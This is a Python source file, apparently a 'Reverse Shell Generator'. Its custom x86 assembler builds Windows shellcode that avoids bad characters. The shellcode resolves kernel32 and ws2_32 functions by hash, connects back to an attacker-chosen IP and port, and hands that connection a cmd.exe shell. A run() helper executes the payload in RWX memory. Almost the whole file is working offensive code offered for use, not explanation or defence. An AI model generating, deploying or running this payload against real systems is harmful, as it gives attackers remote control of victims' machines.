import struct
import sys
import ctypes

class MiniAssembler:
    def __init__(self, bad_chars=None):
        self.bad = set(bad_chars) if bad_chars else set()
        self.code = b""
    
    def has_bad(self, data):
        if isinstance(data, int):
            data = bytes([data])
        return any(b in self.bad for b in data)
    
    def emit(self, data):
        self.code += data
    
    def mov_ebp_esp(self):
        self.emit(b"\x89\xe5")
    
    def mov_eax_imm32(self, val):
        packed = struct.pack('<I', val)
        if not self.has_bad(b"\xb8" + packed):
            self.emit(b"\xb8" + packed)
        else:
            self.xor_eax_eax()
            self.add_eax_imm32(val)
    
    def add_esp_eax(self):
        self.emit(b"\x01\xc4")
    
    def xor_eax_eax(self):
        self.emit(b"\x31\xc0")
    
    def xor_ecx_ecx(self):
        self.emit(b"\x31\xc9")
    
    def xor_edx_edx(self):
        self.emit(b"\x31\xd2")
    
    def mov_esi_fs_ecx_off(self, off):
        self.emit(bytes([0x64, 0x8b, 0x71, off]))
    
    def mov_esi_esi_off(self, off):
        if not self.has_bad(bytes([off])):
            self.emit(bytes([0x8b, 0x76, off]))
        else:
            for delta in range(1, 32):
                new_off = off - delta
                if new_off > 0 and not self.has_bad(bytes([new_off])) and not self.has_bad(bytes([delta])):
                    self.emit(bytes([0x8d, 0x76, new_off]))
                    self.emit(bytes([0x8b, 0x76, delta]))
                    return
            raise ValueError(f"Cannot encode mov esi, [esi+{hex(off)}]")
    
    def lea_esi_esi_off(self, off):
        self.emit(bytes([0x8d, 0x76, off]))
    
    def mov_ebx_esi_off(self, off):
        if not self.has_bad(bytes([off])):
            self.emit(bytes([0x8b, 0x5e, off]))
        else:
            for delta in range(1, 32):
                new_off = off - delta
                if new_off > 0 and not self.has_bad(bytes([new_off])) and not self.has_bad(bytes([delta])):
                    self.emit(bytes([0x8d, 0x5e, new_off]))
                    self.emit(bytes([0x8b, 0x5b, delta]))
                    return
            raise ValueError(f"Cannot encode mov ebx, [esi+{hex(off)}]")
    
    def mov_edi_esi_off(self, off):
        if not self.has_bad(bytes([off])):
            self.emit(bytes([0x8b, 0x7e, off]))
        else:
            for delta in range(1, 32):
                new_off = off - delta
                if new_off > 0 and not self.has_bad(bytes([new_off])) and not self.has_bad(bytes([delta])):
                    self.emit(bytes([0x8d, 0x7e, new_off]))
                    self.emit(bytes([0x8b, 0x7f, delta]))
                    return
            raise ValueError(f"Cannot encode mov edi, [esi+{hex(off)}]")
    
    def mov_esi_esi(self):
        self.emit(b"\x8b\x36")
    
    def cmp_edi_off_cx(self, off):
        self.emit(bytes([0x66, 0x39, 0x4f, off]))
    
    def jne_rel8(self, off):
        if off < 0:
            off = 256 + off
        self.emit(bytes([0x75, off]))
    
    def jmp_rel8(self, off):
        if off < 0:
            off = 256 + off
        self.emit(bytes([0xeb, off]))
    
    def pop_esi(self):
        self.emit(b"\x5e")
    
    def mov_ebp_off_esi(self, off):
        self.emit(bytes([0x89, 0x75, off]))
    
    def call_rel32(self, off):
        packed = struct.pack('<i', off)
        self.emit(b"\xe8" + packed)
    
    def pushal(self):
        self.emit(b"\x60")
    
    def popal(self):
        self.emit(b"\x61")
    
    def mov_eax_ebx_off(self, off):
        self.emit(bytes([0x8b, 0x43, off]))
    
    def mov_edi_ebx_eax_off(self, off):
        self.emit(bytes([0x8b, 0x7c, 0x03, off]))
    
    def add_edi_ebx(self):
        self.emit(b"\x01\xdf")
    
    def mov_ecx_edi_off(self, off):
        if not self.has_bad(bytes([off])):
            self.emit(bytes([0x8b, 0x4f, off]))
        else:
            for delta in range(1, 32):
                new_off = off - delta
                if new_off > 0 and not self.has_bad(bytes([new_off])) and not self.has_bad(bytes([delta])):
                    self.emit(bytes([0x8d, 0x4f, new_off]))
                    self.emit(bytes([0x8b, 0x49, delta]))
                    return
            raise ValueError(f"Cannot encode mov ecx, [edi+{hex(off)}]")
    
    def mov_eax_edi_off(self, off):
        if not self.has_bad(bytes([off])):
            self.emit(bytes([0x8b, 0x47, off]))
        else:
            for delta in range(1, 32):
                new_off = off - delta
                if new_off > 0 and not self.has_bad(bytes([new_off])) and not self.has_bad(bytes([delta])):
                    self.emit(bytes([0x8d, 0x47, new_off]))
                    self.emit(bytes([0x8b, 0x40, delta]))
                    return
            raise ValueError(f"Cannot encode mov eax, [edi+{hex(off)}]")
    
    def add_eax_ebx(self):
        self.emit(b"\x01\xd8")
    
    def mov_ebp_neg4_eax(self):
        self.emit(b"\x89\x45\xfc")
    
    def jecxz_rel8(self, off):
        self.emit(bytes([0xe3, off]))
    
    def dec_ecx(self):
        self.emit(b"\x49")
    
    def mov_eax_ebp_neg4(self):
        self.emit(b"\x8b\x45\xfc")
    
    def mov_esi_eax_ecx4(self):
        self.emit(b"\x8b\x34\x88")
    
    def add_esi_ebx(self):
        self.emit(b"\x01\xde")
    
    def cdq(self):
        self.emit(b"\x99")
    
    def cld(self):
        self.emit(b"\xfc")
    
    def lodsb(self):
        self.emit(b"\xac")
    
    def test_al_al(self):
        self.emit(b"\x84\xc0")
    
    def je_rel8(self, off):
        self.emit(bytes([0x74, off]))
    
    def ror_edx_imm8(self, val):
        if not self.has_bad(bytes([val])):
            self.emit(bytes([0xc1, 0xca, val]))
        else:
            count = val
            while count > 0:
                if count >= 8 and not self.has_bad(bytes([8])):
                    self.emit(bytes([0xc1, 0xca, 0x08]))
                    count -= 8
                elif count >= 1:
                    self.emit(b"\xd1\xca")
                    count -= 1
    
    def add_edx_eax(self):
        self.emit(b"\x01\xc2")
    
    def cmp_edx_esp_off(self, off):
        self.emit(bytes([0x3b, 0x54, 0x24, off]))
    
    def mov_edx_edi_off(self, off):
        self.emit(bytes([0x8b, 0x57, off]))
    
    def add_edx_ebx(self):
        self.emit(b"\x01\xda")
    
    def mov_cx_edx_ecx2(self):
        self.emit(b"\x66\x8b\x0c\x4a")
    
    def mov_eax_edx_ecx4(self):
        self.emit(b"\x8b\x04\x8a")
    
    def mov_esp_off_eax(self, off):
        self.emit(bytes([0x89, 0x44, 0x24, off]))
    
    def ret(self):
        self.emit(b"\xc3")
    
    def push_imm32(self, val):
        packed = struct.pack('<I', val)
        if not self.has_bad(b"\x68" + packed):
            self.emit(b"\x68" + packed)
        else:
            for key in [0x01010101, 0x02020202, 0x03030303, 0x04040404, 0x05050505]:
                enc = val ^ key
                enc_p = struct.pack('<I', enc)
                key_p = struct.pack('<I', key)
                if not self.has_bad(enc_p) and not self.has_bad(key_p):
                    self.emit(b"\x68" + enc_p)
                    self.emit(b"\x58")
                    self.emit(b"\x35" + key_p)
                    self.emit(b"\x50")
                    return
            raise ValueError(f"Cannot encode push {hex(val)}")
    
    def call_ebp_off(self, off):
        if not self.has_bad(bytes([off])):
            self.emit(bytes([0xff, 0x55, off]))
        else:
            raise ValueError(f"Cannot encode call [ebp+{hex(off)}]")
    
    def mov_ebp_off_eax(self, off):
        if not self.has_bad(bytes([off])):
            self.emit(bytes([0x89, 0x45, off]))
        else:
            raise ValueError(f"Cannot encode mov [ebp+{hex(off)}], eax")
    
    def mov_ax_imm16(self, val):
        packed = struct.pack('<H', val)
        if not self.has_bad(b"\x66\xb8" + packed):
            self.emit(b"\x66\xb8" + packed)
            return
        for delta in range(1, 16):
            alt = val + delta
            if alt <= 0xffff and not self.has_bad(struct.pack('<H', alt)):
                self.emit(b"\x66\xb8" + struct.pack('<H', alt))
                for _ in range(delta):
                    self.emit(b"\x66\x48")
                return
            alt = val - delta
            if alt >= 0 and not self.has_bad(struct.pack('<H', alt)):
                self.emit(b"\x66\xb8" + struct.pack('<H', alt))
                for _ in range(delta):
                    self.emit(b"\x66\x40")
                return
        lo = val & 0xff
        hi = (val >> 8) & 0xff
        self.xor_eax_eax()
        if not self.has_bad(bytes([lo])):
            self.emit(bytes([0xb0, lo]))
        else:
            for d in range(1, 32):
                if not self.has_bad(bytes([lo + d])):
                    self.emit(bytes([0xb0, lo + d]))
                    for _ in range(d):
                        self.emit(b"\xfe\xc8")
                    break
                if not self.has_bad(bytes([lo - d])):
                    self.emit(bytes([0xb0, lo - d]))
                    for _ in range(d):
                        self.emit(b"\xfe\xc0")
                    break
        if not self.has_bad(bytes([hi])):
            self.emit(bytes([0xb4, hi]))
        else:
            for d in range(1, 32):
                if not self.has_bad(bytes([hi + d])):
                    self.emit(bytes([0xb4, hi + d]))
                    for _ in range(d):
                        self.emit(b"\xfe\xcc")
                    break
                if not self.has_bad(bytes([hi - d])):
                    self.emit(bytes([0xb4, hi - d]))
                    for _ in range(d):
                        self.emit(b"\xfe\xc4")
                    break
    
    def push_eax(self):
        self.emit(b"\x50")
    
    def push_ebx(self):
        self.emit(b"\x53")
    
    def push_esp(self):
        self.emit(b"\x54")
    
    def push_esi(self):
        self.emit(b"\x56")
    
    def push_edi(self):
        self.emit(b"\x57")
    
    def pop_eax(self):
        self.emit(b"\x58")
    
    def pop_ebx(self):
        self.emit(b"\x5b")
    
    def pop_edi(self):
        self.emit(b"\x5f")
    
    def mov_ebx_eax(self):
        self.emit(b"\x89\xc3")
    
    def mov_esi_eax(self):
        self.emit(b"\x89\xc6")
    
    def mov_eax_esp(self):
        self.emit(b"\x89\xe0")
    
    def mov_cx_imm16(self, val):
        packed = struct.pack('<H', val)
        self.emit(b"\x66\xb9" + packed)
    
    def sub_eax_ecx(self):
        self.emit(b"\x29\xc8")
    
    def mov_al_imm8(self, val):
        if not self.has_bad(bytes([val])):
            self.emit(bytes([0xb0, val]))
        else:
            if val > 0 and not self.has_bad(bytes([val - 1])):
                self.emit(bytes([0xb0, val - 1]))
                self.emit(b"\xfe\xc0")
            elif val < 255 and not self.has_bad(bytes([val + 1])):
                self.emit(bytes([0xb0, val + 1]))
                self.emit(b"\xfe\xc8")
            else:
                self.xor_eax_eax()
                self.add_al_imm8(val)
    
    def mov_cl_imm8(self, val):
        if not self.has_bad(bytes([val])):
            self.emit(bytes([0xb1, val]))
        else:
            if val > 0 and not self.has_bad(bytes([val - 1])):
                self.emit(bytes([0xb1, val - 1]))
                self.emit(b"\xfe\xc1")
    
    def sub_al_imm8(self, val):
        self.emit(bytes([0x2c, val]))
    
    def add_al_imm8(self, val):
        if not self.has_bad(bytes([val])):
            self.emit(bytes([0x04, val]))
        else:
            half = val // 2
            if not self.has_bad(bytes([half])):
                self.emit(bytes([0x04, half]))
                self.emit(bytes([0x04, val - half]))
    
    def add_eax_ecx(self):
        self.emit(b"\x01\xc8")
    
    def add_eax_imm32(self, val):
        packed = struct.pack('<I', val)
        self.emit(b"\x05" + packed)
    
    def xor_eax_imm32(self, val):
        packed = struct.pack('<I', val)
        self.emit(b"\x35" + packed)
    
    def shl_eax_imm8(self, val):
        self.emit(bytes([0xc1, 0xe0, val]))
    
    def add_ax_imm8(self, val):
        if not self.has_bad(bytes([val])):
            self.emit(bytes([0x66, 0x83, 0xc0, val]))
        else:
            for i in range(1, val):
                if not self.has_bad(bytes([i])) and not self.has_bad(bytes([val - i])):
                    self.emit(bytes([0x66, 0x83, 0xc0, i]))
                    self.emit(bytes([0x66, 0x83, 0xc0, val - i]))
                    return
            for _ in range(val):
                self.emit(b"\x66\x40")
    
    def inc_eax(self):
        self.emit(b"\x40")
    
    def dec_eax(self):
        self.emit(b"\x48")
    
    def inc_ax(self):
        self.emit(b"\x66\x40")
    
    def neg_eax(self):
        self.emit(b"\xf7\xd8")
    
    def push_imm8(self, val):
        if val < 0:
            val = 256 + val
        self.emit(bytes([0x6a, val & 0xff]))

class ShellcodeGenerator:
    def __init__(self, ip, port, bad_chars=None):
        self.ip = ip
        self.port = port
        self.bad = set(bad_chars) if bad_chars else set()
        self.asm = MiniAssembler(self.bad)
    
    def ip_to_int(self):
        parts = [int(x) for x in self.ip.split('.')]
        return struct.unpack('<I', bytes(parts))[0]
    
    def generate(self):
        a = self.asm
        use_lea = 0x20 in self.bad
        a.mov_ebp_esp()
        a.mov_eax_imm32(0xfffff9f0)
        a.add_esp_eax()
        a.xor_ecx_ecx()
        a.mov_esi_fs_ecx_off(0x30)
        a.mov_esi_esi_off(0x0c)
        a.mov_esi_esi_off(0x1c)
        a.mov_ebx_esi_off(0x08)
        a.mov_edi_esi_off(0x20)
        a.mov_esi_esi()
        a.cmp_edi_off_cx(0x18)
        loop_jne = -17 if use_lea else -14
        a.jne_rel8(loop_jne)
        a.jmp_rel8(0x06)
        a.pop_esi()
        a.mov_ebp_off_esi(0x04)
        base_jmp = 0x57 if use_lea else 0x54
        ror_extra = 10 if 0x0d in self.bad else 0
        jmp_fwd = base_jmp + ror_extra
        a.jmp_rel8(jmp_fwd)
        a.call_rel32(-11)
        a.pushal()
        a.mov_eax_ebx_off(0x3c)
        a.mov_edi_ebx_eax_off(0x78)
        a.add_edi_ebx()
        a.mov_ecx_edi_off(0x18)
        a.mov_eax_edi_off(0x20)
        a.add_eax_ebx()
        a.mov_ebp_neg4_eax()
        jecxz_fwd = 0x36 if 0x0d not in self.bad else 0x40
        a.jecxz_rel8(jecxz_fwd)
        a.dec_ecx()
        a.mov_eax_ebp_neg4()
        a.mov_esi_eax_ecx4()
        a.add_esi_ebx()
        a.xor_eax_eax()
        a.cdq()
        a.cld()
        a.lodsb()
        a.test_al_al()
        ror_size = 3 if 0x0d not in self.bad else 13
        je_target = ror_size + 2 + 2
        a.je_rel8(je_target)
        a.ror_edx_imm8(0x0d)
        a.add_edx_eax()
        jmp_back = -(1 + 2 + 2 + ror_size + 2 + 2)
        a.jmp_rel8(jmp_back)
        a.cmp_edx_esp_off(0x24)
        jne_back = -33 if 0x0d not in self.bad else -43
        a.jne_rel8(jne_back)
        a.mov_edx_edi_off(0x24)
        a.add_edx_ebx()
        a.mov_cx_edx_ecx2()
        a.mov_edx_edi_off(0x1c)
        a.add_edx_ebx()
        a.mov_eax_edx_ecx4()
        a.add_eax_ebx()
        a.mov_esp_off_eax(0x1c)
        a.popal()
        a.ret()
        off = {'wait': 0x08, 'lib': 0x0c, 'proc': 0x10, 'start': 0x14, 'sock': 0x18, 'conn': 0x1c}
        a.push_imm32(0x78b5b983)
        a.call_ebp_off(0x04)
        a.mov_ebp_off_eax(off['wait'])
        a.push_imm32(0xec0e4e8e)
        a.call_ebp_off(0x04)
        a.mov_ebp_off_eax(off['lib'])
        a.push_imm32(0x16b3fe72)
        a.call_ebp_off(0x04)
        a.mov_ebp_off_eax(off['proc'])
        a.xor_eax_eax()
        a.mov_ax_imm16(0x6c6c)
        a.push_eax()
        a.push_imm32(0x642e3233)
        a.push_imm32(0x5f327377)
        a.push_esp()
        a.call_ebp_off(off['lib'])
        a.mov_ebx_eax()
        a.push_imm32(0x3bfcedcb)
        a.call_ebp_off(0x04)
        a.mov_ebp_off_eax(off['start'])
        a.push_imm32(0xadf509d9)
        a.call_ebp_off(0x04)
        a.mov_ebp_off_eax(off['sock'])
        a.push_imm32(0xb32dba0c)
        a.call_ebp_off(0x04)
        a.mov_ebp_off_eax(off['conn'])
        a.mov_eax_esp()
        a.xor_ecx_ecx()
        a.mov_cx_imm16(0x0590)
        a.sub_eax_ecx()
        a.push_eax()
        a.xor_eax_eax()
        a.mov_ax_imm16(0x0202)
        a.push_eax()
        a.call_ebp_off(off['start'])
        a.xor_eax_eax()
        a.push_eax()
        a.push_eax()
        a.push_eax()
        a.mov_al_imm8(0x06)
        a.push_eax()
        a.sub_al_imm8(0x05)
        a.push_eax()
        a.inc_eax()
        a.push_eax()
        a.call_ebp_off(off['sock'])
        a.mov_esi_eax()
        a.xor_eax_eax()
        a.push_eax()
        a.push_eax()
        ip_int = self.ip_to_int()
        a.push_imm32(ip_int)
        port_net = ((self.port >> 8) & 0xff) | ((self.port & 0xff) << 8)
        a.mov_ax_imm16(port_net)
        a.shl_eax_imm8(0x10)
        a.add_ax_imm8(0x02)
        a.push_eax()
        a.push_esp()
        a.pop_edi()
        a.xor_eax_eax()
        a.push_eax()
        a.push_eax()
        a.push_eax()
        a.push_eax()
        a.add_al_imm8(0x10)
        a.push_eax()
        a.push_edi()
        a.push_esi()
        a.call_ebp_off(off['conn'])
        a.push_esi()
        a.push_esi()
        a.push_esi()
        a.xor_eax_eax()
        a.push_eax()
        a.push_eax()
        a.mov_al_imm8(0x80)
        a.xor_ecx_ecx()
        a.mov_cl_imm8(0x80)
        a.add_eax_ecx()
        a.push_eax()
        a.xor_eax_eax()
        for _ in range(10):
            a.push_eax()
        a.mov_al_imm8(0x44)
        a.push_eax()
        a.push_esp()
        a.pop_edi()
        a.mov_eax_imm32(0xff9a879b)
        a.neg_eax()
        a.push_eax()
        a.push_imm32(0x2e646d63)
        a.push_esp()
        a.pop_ebx()
        a.mov_eax_esp()
        a.xor_ecx_ecx()
        a.mov_cx_imm16(0x0390)
        a.sub_eax_ecx()
        a.push_eax()
        a.push_edi()
        a.xor_eax_eax()
        a.push_eax()
        a.push_eax()
        a.push_eax()
        a.inc_eax()
        a.push_eax()
        a.dec_eax()
        a.push_eax()
        a.push_eax()
        a.push_ebx()
        a.push_eax()
        a.call_ebp_off(off['proc'])
        a.xor_ecx_ecx()
        a.emit(b"\x51")
        a.push_imm8(-1)
        a.call_ebp_off(off['wait'])
        return a.code
    
    def check_bad(self):
        found = []
        for i, b in enumerate(self.asm.code):
            if b in self.bad:
                found.append((i, b))
        return found

def parse_bad(s):
    chars = set()
    s = s.replace(' ', '').replace(',', '').lower()
    i = 0
    while i < len(s):
        if s[i:i+2] == '\\x':
            chars.add(int(s[i+2:i+4], 16))
            i += 4
        elif s[i:i+2] == '0x':
            chars.add(int(s[i+2:i+4], 16))
            i += 4
        else:
            i += 1
    return chars

def run(shellcode):
    ba = bytearray(shellcode)
    buf = (ctypes.c_char * len(ba)).from_buffer(ba)
    ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(shellcode))
    print(f"[*] @ {hex(ptr)}")
    input("[>] ENTER...")
    ht = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ht, -1)

def main():
    print(" Reverse Shell Generator")
    ip = input("[?] LHOST: ").strip()
    port = int(input("[?] LPORT: ").strip())
    bad_input = input("[?] Bad chars: ").strip()
    bad = parse_bad(bad_input) if bad_input else set()
    print(f"\n[*] {ip}:{port}")
    print(f"[*] Bad: {[hex(x) for x in sorted(bad)]}")
    gen = ShellcodeGenerator(ip, port, bad)
    sc = gen.generate()
    found = gen.check_bad()
    if found:
        print(f"\n[!] Bad chars found:")
        for off, b in found[:5]:
            print(f"    {off}: 0x{b:02x}")
    else:
        print(f"\n[+] Clean!")
    print(f"[+] Size: {len(sc)} bytes\n")
    hex_str = ''.join(f'\\x{b:02x}' for b in sc)
    print(f'shellcode = b"{hex_str}"')
    if input("\n[?] Run? (y/n): ").lower() == 'y':
        run(sc)

if __name__ == "__main__":
    main()
